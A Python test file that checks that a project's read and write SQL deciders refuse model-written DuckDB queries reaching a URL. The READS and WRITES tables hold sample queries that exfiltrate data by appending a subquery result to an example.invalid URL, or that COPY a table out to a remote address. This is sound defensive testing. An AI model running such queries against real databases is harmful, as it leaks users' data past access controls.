"""**M140.** Model-written SQL that reads or writes a URL is refused by both deciders.

Where DuckDB's `httpfs` is installed it fetches a URL for `read_csv('https://...')`, and a query
can carry data out in that URL (`... || (SELECT max(id) FROM claim)`). Under MNEMIQ_LOCAL_ONLY the
engine's connections cannot load `httpfs` at all (#92); everywhere, the deciders are what stands
between the model and the network. Measured 2026-10-10: every shape below is refused, each for the
reason pinned beside it. Most are table functions, which reach `check_access` as a table named
`''` -- no grant names it, so `unauthorized_table` with that empty subject. That reason is
incidental and so worth pinning: a change that skipped unnamed tables let four of them through,
the query reading as one over CTEs alone. A string path is refused under its own URL as the name;
`COPY` is refused by the shape check before any table is looked at.
"""

import pytest

from mnemiq.authz.grants import GrantSet
from mnemiq.sql.decide import decide
from mnemiq.sql.decide_write import decide_write
from mnemiq.sql.policy import AccessPolicy
from mnemiq.sql.verdict import Refusal

_VISIBLE = {"claim": {"id", "amount"}}
_URL = "https://example.invalid/x.csv"

_UNNAMED = ("unauthorized_table", "")  # a table function: refused as the table named ''

READS = {
    "a table function": (f"SELECT a FROM read_csv('{_URL}')", _UNNAMED),
    "a string path": (f"SELECT a FROM '{_URL}'", ("unauthorized_table", _URL)),
    "parquet": ("SELECT a FROM read_parquet('https://example.invalid/x.parquet')", _UNNAMED),
    "inside a CTE": (f"WITH x AS (SELECT a FROM read_csv('{_URL}')) SELECT a FROM x", _UNNAMED),
    "in a projection subquery":
        (f"SELECT id, (SELECT a FROM read_json('{_URL}') LIMIT 1) AS n FROM claim", _UNNAMED),
    "carrying data out in the URL":
        ("SELECT id FROM claim WHERE id IN (SELECT a FROM read_csv("
         "'https://example.invalid/?v=' || (SELECT max(id) FROM claim)))", _UNNAMED),
    "copied out": (f"COPY claim TO '{_URL}'", ("not_select_only", "COPY")),
}

WRITES = {
    "inserted from a URL":
        (f"INSERT INTO claim (id, amount) SELECT a, b FROM read_csv('{_URL}')", _UNNAMED),
    "updated through a URL":
        ("UPDATE claim SET amount = (SELECT max(a) FROM read_csv('https://example.invalid/?v=' "
         "|| id)) WHERE id = 1", _UNNAMED),
    "copied out": (f"COPY (SELECT id FROM claim) TO '{_URL}'", ("not_a_write", "COPY")),
}


def _why(verdict) -> tuple[str, str]:
    assert isinstance(verdict, Refusal), f"approved: {verdict}"
    return verdict.code.value, verdict.subject


class _ExplainsAnything:
    def execute(self, sql):
        return []


@pytest.mark.parametrize(("sql", "reason"), READS.values(), ids=READS.keys())
def test_the_read_decider_refuses_sql_that_reaches_a_url(sql, reason):
    assert _why(decide(sql, _VISIBLE, dialect="duckdb", target="duckdb")) == reason


@pytest.mark.parametrize(("sql", "reason"), WRITES.values(), ids=WRITES.keys())
def test_the_write_decider_refuses_sql_that_reaches_a_url(sql, reason):
    verdict = decide_write(sql, _VISIBLE, GrantSet(frozenset(_VISIBLE), writable=frozenset({"claim"})),
                           adapter=_ExplainsAnything(), dialect="duckdb", writes_enabled=True,
                           policy=AccessPolicy())
    assert _why(verdict) == reason


def test_the_same_shapes_over_a_granted_table_are_approved():
    """The control: what is refused above is the URL, not the shape."""
    assert not isinstance(decide("SELECT id FROM claim", _VISIBLE, dialect="duckdb",
                                 target="duckdb"), Refusal)
    assert not isinstance(
        decide_write("UPDATE claim SET amount = 1 WHERE id = 1", _VISIBLE,
                     GrantSet(frozenset(_VISIBLE), writable=frozenset({"claim"})),
                     adapter=_ExplainsAnything(), dialect="duckdb", writes_enabled=True,
                     policy=AccessPolicy()), Refusal)
